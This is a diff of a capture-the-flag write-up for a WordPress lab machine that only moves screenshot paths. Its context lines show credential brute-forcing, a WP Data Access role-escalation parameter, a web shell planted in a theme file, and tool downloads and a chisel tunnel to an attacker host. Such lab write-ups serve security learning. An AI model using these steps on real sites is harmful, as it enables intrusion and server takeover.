@@ -33,7 +33,7 @@ $ ffuf -u 'http://10.10.225.113/FUZZ' -w /usr/share/seclists/Discovery/Web-Conte
 wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 90ms]
 ```
 At http://10.10.225.113/wordpress/, we discover a WordPress installation.
-![Scan result](web_80_wordpress.png)
+![Scan result](images/web_80_wordpress.png)
 Enumerating the WordPress
 We can use wpscan to quickly enumerate the application.
 ```
@@ -87,19 +87,19 @@ $ wpscan --url http://10.10.225.113/wordpress/ -U admin,bob -P /usr/share/seclis
 ...
 ```
 Now, using the found credentials, we can log in to WordPress at http://10.10.225.113/wordpress/wp-login.php as the bob user.
-![Scan result](web_80_wordpress_login.png)
+![Scan result](images/web_80_wordpress_login.png)
 WordPress Privilege Escalation
 After logging in, we are redirected to http://10.10.225.113/wordpress/wp-admin/profile.php, where we see that we don’t have many privileges.
-![Scan result](web_80_wordpress_profile.png)
+![Scan result](images/web_80_wordpress_profile.png)
 Now, going back to our initial enumeration, we noted that the wp-data-access v5.3.5 plugin is installed. After looking for vulnerabilities in it, we found this article, which explains that a vulnerability in WP Data Access allows unauthorized users to modify their roles. To do this, all they need to do is supply the wpda_role[] parameter during a profile update.
 
 To exploit this, we will intercept the profile update request using Burp and append &wpda_role[]=administrator to our request data as follows:
-![Scan result](web_80_wordpress_privesc.png)
+![Scan result](images/web_80_wordpress_privesc.png)
 As we can see, after the request, our role is changed, and we gained admin access to WordPress.
-![Scan result](web_80_wordpress_admin_access.png)
+![Scan result](images/web_80_wordpress_admin_access.png)
 WordPress RCE
 To turn this admin access into RCE, we can simply edit one of the PHP files in the theme to include a simple web shell using the Tools -> Theme File Editor.
-![Scan result](web_80_wordpress_theme_edit.png)
+![Scan result](images/web_80_wordpress_theme_edit.png)
 After updating the file, we can confirm that our web shell works.
 ```
 $ curl -s -X GET 'http://10.10.225.113/wordpress/wp-content/themes/twentytwentyfour/functions.php?cmd=id'
@@ -146,7 +146,7 @@ www-data@Breakme:/tmp$ ./chisel client 10.11.72.22:7777 R:9999:127.0.0.1:9999 &
 ```
 Command Injection
 Now, visiting http://127.0.0.1:9999/, we see three input fields.
-![Scan result](web_9999_index.png)
+![Scan result](images/web_9999_index.png)
 Looking at the application, it seems to execute commands with user input. We can run pspy64 on the machine to gain a better understanding of what the application does.
 ```
 www-data@Breakme:/tmp$ curl -s http://10.11.72.22/pspy64 -o pspy64
@@ -183,7 +183,7 @@ By trying a list of special characters such as ~ ! @ # $ % ^ & * ( ) - _ + = { }
 
 We find that the characters $, {, }, |, ., and / do not get replaced.
 
-![Scan result](web_9999_special_chars.png)
+![Scan result](images/web_9999_special_chars.png)
 ```
 2024/09/20 21:23:18 CMD: UID=1002  PID=1329   | /usr/bin/php -S 127.0.0.1:9999
 2024/09/20 21:23:18 CMD: UID=1002  PID=1330   | sh -c id ${}|./: >/dev/null 2>&1 &
